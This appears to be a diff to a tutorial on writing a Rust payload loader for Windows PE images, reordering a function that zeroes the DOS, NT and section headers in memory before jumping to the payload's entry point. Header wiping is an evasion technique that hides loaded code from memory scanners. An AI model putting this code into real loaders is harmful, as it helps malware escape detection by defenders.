@@ -431,25 +431,23 @@ Three areas to wipe:
 // src/pe.rs
 pub fn wipe_pe_headers(base_addr: *mut c_void) {
     unsafe {
-        // wipe DOS header
-        ptr::write_bytes(base_addr, 0, 0x40);
-
-        // wipe NT headers
+        // read offsets before we zero anything
         let e_lfanew = *(base_addr.add(0x3C) as *const u32);
         let nt_headers = base_addr.add(e_lfanew as usize);
         let size_of_nt_headers = 0xF8;
-        ptr::write_bytes(nt_headers, 0, size_of_nt_headers);
-
-        // wipe section headers
         let number_of_sections = *(nt_headers.add(6) as *const u16);
         let section_headers = nt_headers.add(size_of_nt_headers);
         let section_headers_size = number_of_sections as usize * 0x28;
+
+        // now wipe everything
+        ptr::write_bytes(base_addr, 0, 0x40);
+        ptr::write_bytes(nt_headers, 0, size_of_nt_headers);
         ptr::write_bytes(section_headers, 0, section_headers_size);
     }
 }
 ```
 
-We read `e_lfanew` and `NumberOfSections` before zeroing the NT headers, obviously, since we still need those values to find the section header array.
+We read all the offsets and sizes before zeroing anything, since `e_lfanew` lives inside the DOS header we're about to wipe.
 
 ## Executing the payload
 Now we just jump to the entry point.
